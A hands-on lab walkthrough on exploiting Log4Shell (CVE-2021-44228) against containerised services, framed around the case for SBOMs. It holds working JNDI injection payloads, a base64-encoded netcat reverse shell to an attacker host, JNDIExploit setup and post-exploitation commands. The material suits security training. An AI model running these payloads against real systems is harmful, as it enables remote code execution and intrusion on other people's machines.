Step 1

Welcome To The Exercise

This module simulates the attacker side of a newly disclosed software vulnerability — CVE-2021-44228, known as Log4Shell. You are operating inside an isolated classroom lab environment. Your goal is to move through a realistic attack chain: from passive port discovery, through application fingerprinting, to full remote code execution and an interactive reverse shell.

This is not a click-through quiz. Every step requires you to run real commands against real services. The UI guides you through what to think about, but the work happens in your terminal.

What is Log4Shell?

CVE-2021-44228 is a critical remote code execution vulnerability in Apache Log4j 2, versions 2.0-beta9 through 2.14.1. When a vulnerable application logs attacker-controlled input, Log4j processes embedded JNDI lookup strings — triggering outbound network requests that can be redirected to load and execute arbitrary Java code on the target server.

Why it matters for SBOMs

Log4Shell became the defining argument for Software Bill of Materials (SBOM) adoption. An SBOM would have listed Log4j 2.14.1 as a transitive dependency before the vulnerability was announced — giving defenders time to patch before attackers could exploit it. In this lab, you will find that jar on disk yourself after achieving RCE.

Lab services overview

The target VM runs four services. Two are custom Spring Boot applications using vulnerable Log4j. One is a Python Flask service with no Log4j dependency. One is a reference vulnerable app from the security community. Your job is to identify which is which — without being told in advance.

What you will accomplish

  1. Run an nmap scan to discover open ports on the target VM.
  2. Use curl to manually fingerprint each service — routes, methods, input shapes, and framework hints.
  3. Run the recon script to confirm which services trigger a Log4Shell LDAP callback.
  4. Run the exploit script to demonstrate the RCE attack chain against a confirmed vulnerable service.
  5. Perform a manual three-terminal reverse shell attack against the port 8180 reference app.
  6. Read flags from inside the container to prove code execution.
  7. Locate the Log4j jar on disk — the SBOM artifact that would have prevented all of this.

Step 3

Application Mapping

Your nmap scan should have revealed four open ports: 8101, 8102, 8103, and 8180. Leave 8180 alone for now — that is the manual exploitation target at the end of the exercise.

Here is what you are working with on ports 8101–8103:

How to interpret the responses

  • 200 OK means the route exists and accepted your request.
  • 404 Not Found means that route does not exist on the service.
  • 405 Method Not Allowed means the route exists, but you used the wrong HTTP method. This is a strong clue that the endpoint may expect something like POST instead of GET.
  • Server headers and response bodies can also reveal framework clues, like Spring Boot or Flask.

Step 4

Log4j Probing Plan

You now have a map of the services. Before running the automated recon script, build the mental model the script is about to confirm. Understanding why you are targeting specific routes and fields is what separates a trained operator from someone blindly running tools.

The Log4Shell trigger condition

For Log4Shell to fire, three things must be true simultaneously:

  1. The application must use a vulnerable version of Log4j (2.0-beta9 through 2.14.1).
  2. The application must log attacker-controlled input using Log4j — for example, logger.info("Login attempt: {}", username).
  3. The Log4j instance must not have JNDI lookups disabled — the default before the patch.

Your job is to identify which input fields are likely being passed to a Log4j logger. Fields that get logged are typically things like usernames, search queries, email addresses — anything that helps operators audit user activity.

Manual validation commands

# Confirm 8101 accepts a POST login with JSON username field
docker exec -it hafb-demo-rt-log4j-attacker-1 bash

curl -i -X POST http://host.docker.internal:8101/login \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser","password":"testpass"}'

# Confirm 8102 returns results for a search query parameter
curl -i "http://host.docker.internal:8102/search?q=F-35"

# Confirm 8103 responds but is Python-based (negative control)
curl -i "http://host.docker.internal:8103/search?q=test"
Demo note: Because you are on the demo, you use host.docker.internal in place of your target's <TARGET_IP>.

Why 8103 is the negative control

Service 3 accepts user input and has a search endpoint. A less careful operator might include it in the canary sweep. The correct reasoning is simpler: the service is written in Python. Log4j is a Java library. A Python application cannot be vulnerable to Log4Shell regardless of what input it accepts. The Server header in the HTTP response makes this clear.

Step 5

Recon Script — LDAP Callback Confirmation

The recon script automates what you just planned manually. It fingerprints each service, starts a marshalsec LDAP server, sends JNDI canary payloads to the likely injection points, and reports which services trigger a callback. A callback confirms Log4j is present, vulnerable, and logging the injected field.

What the script does under the hood

  1. Phase 1 — Fingerprinting: Checks headers and response bodies for Java/Spring Boot indicators.
  2. Phase 2 — Marshalsec: Starts a local LDAP redirect server to receive callbacks.
  3. Phase 3 — Canary payloads: Sends a JNDI payload to the most likely logged input on each service. A vulnerable service makes an outbound LDAP connection back to marshalsec.

Run the script

docker exec -it hafb-demo-rt-log4j-attacker-1 bash

# From inside the attacker container
python3 tools/exploit/log4shell_recon.py --scan

When prompted, enter your target container IP, your attacking container IP, and ports 8101, 8102, and 8103. Do not include 8180 — that service uses a different injection point (an HTTP header) that the script does not probe automatically.

Demo note: In DEMO-FULL, use host.docker.internal if the script asks for the target. Use hafb-demo-rt-log4j-attacker-1 if you need the attacker callback host. Enter ports 8101, 8102, and 8103, and leave 8180 for the manual stage.

Expected results

  • 8101: VULNERABLE — LDAP callback confirmed via POST /login username field.
  • 8102: VULNERABLE — LDAP callback confirmed via GET /search q parameter.
  • 8103: SAFE — No callback. Python service, no Log4j.

Look for the RECON RESULTS section at the bottom of the script output.

Step 7

Manual Reverse Shell — Port 8180

This is the hands-on capstone of the exercise. You will manually exploit the reference vulnerable application on port 8180 to obtain an interactive shell inside the target container. Every command here is typed by you. This is what real exploitation looks like.

Why 8180 is different: The service on port 8180 does not have a login route or a search query parameter. Its injection point is an HTTP request header — X-Api-Version. This is a common API pattern and demonstrates that Log4Shell can fire from any logged input, not just form fields.

The three-terminal attack chain

  • Terminal 1 — JNDIExploit: Acts as both the LDAP server (receives the JNDI lookup) and the HTTP server (serves the malicious Java class). Runs inside the attacker container.
  • Terminal 2 — netcat listener: Waits for the reverse shell connection from the target container. Runs inside the attacker container.
  • Terminal 3 — curl trigger: Sends the HTTP request with the JNDI payload in the header. Runs inside the attacker container.

Terminal 1 Start JNDIExploit inside the attacker container

Open a new terminal on your machine and run:

# DEMO-FULL equivalent
docker exec -it hafb-demo-rt-log4j-attacker-1 java -jar /tools/jndi/JNDIExploit-1.2-SNAPSHOT.jar -i <ATTACKER_IP> -p 8888

Replace <ATTACKER_IP> with your attacker's IP address (172.22.0.6). Wait until you see both lines before moving on:

Demo note: If you need help finding the IPs of your vulnerable and attacking containers, run the following commands and look for the IP addresses beginning with "172":
  • docker inspect hafb-demo-rt-log4j-attacker-1 --format "{{json .NetworkSettings.Networks}}"
  • docker inspect hafb-demo-log4j-vulnerable-app-1 --format "{{json .NetworkSettings.Networks}}"
Hint: Attacker container IP: 172.22.0.6 — Vulnerable app IP: 172.22.0.5 
[+] LDAP Server Start Listening on 1389...
[+] HTTP Server Start Listening on 8888...

Leave this terminal running. As the exploit fires you will see [+] Received LDAP Query, [+] Send LDAP reference result, and critically [+] Receive ClassRequest when the target JVM fetches and executes the malicious class.

Terminal 2 Start your netcat listener on attacker host

Open a second terminal on your attacking container. This is where the reverse shell will appear:

docker exec -it hafb-demo-rt-log4j-attacker-1 nc -lvnp 4444

For the purpose of this demo, this runs inside the container. The reverse shell from the target container will connect back to your attacker container on port 4444. Leave it running silently and watch it.

Terminal 3 Generate the payload and fire

Open a third terminal on your attacker container. First, generate your base64-encoded reverse shell payload:

# Generate the netcat reverse shell payload — encode as base64
docker exec -it hafb-demo-rt-log4j-attacker-1 bash

echo "nc <ATTACKER_IP> 4444 -e /bin/sh" | base64 -w 0

Replace <ATTACKER_IP> with your attacking container IP. See the DEMO note from the steps in terminal one if you having trouble finding the IP. Copy the base64 output.

We use netcat with -e /bin/sh because it is the most reliable reverse shell method in minimal Java containers. We base64-encode the command because JNDI paths cannot contain spaces or special characters.

Now fire the payload. Replace all three placeholders with your actual values:

# Replace <TARGET_IP>, <ATTACKER_IP>, and <BASE64> with your values
curl http://<TARGET_IP>:8080 -H 'X-Api-Version: ${jndi:ldap://<ATTACKER_IP>:1389/Basic/Command/Base64/<BASE64>}'

<TARGET_IP> — the vulnerable VM's IP address.
<ATTACKER_IP> — your attacking container's IP address.
<BASE64> — the output of the echo command above.

Demo note: Internally to the vulnerable machine, the port of the vulnerable service is 8080. Which is why we use that instead of 8180. This is solely for the purpose of a demo env where you are not using 2 different machines (i.e. Kali-Red and Ubuntu-Vulnerable) to perform these labs.

Watch What happens next

  • Terminal 1 (JNDIExploit): You will see [+] Received LDAP Query, then [+] New HTTP Request, then [+] Receive ClassRequest and [+] Response Code: 200. This confirms the target JVM fetched and executed the malicious class.
  • Terminal 2 (netcat): A shell prompt appears. You are now inside the target container. You have remote code execution.
  • Terminal 3 (curl): The curl command will hang — this is normal. The action is in the other two terminals.

Shell Commands to run once you have the shell

# Prove code execution — read the flag
cat /flags/app_flag.txt

# Find the Log4j jar — this is the SBOM artifact
find / -name 'log4j*.jar' 2>/dev/null

# See what user you are running as
whoami && id

# What is running in this container?
ps aux

# What can this container reach on the network?
ip a && cat /etc/hosts

The find / -name 'log4j*.jar' command is the SBOM money shot. The jar you find on disk is exactly what a Software Bill of Materials would have listed before this vulnerability was ever disclosed — and what would have given defenders time to patch before you got here.

Step 8

Debrief

You have completed the full attack chain. Take a few minutes to consolidate what you observed and what it means from both the attacker and defender perspective.

The SBOM argument

The Log4j jar you found on disk is a transitive dependency — the developers did not explicitly choose Log4j. It was pulled in automatically by Spring Boot's logging starter. Without an SBOM, there was no inventory of what was actually running inside the application. With an SBOM, Log4j 2.14.1 would have appeared as a known component before CVE-2021-44228 was published — and the patch would have been applied before attackers arrived.
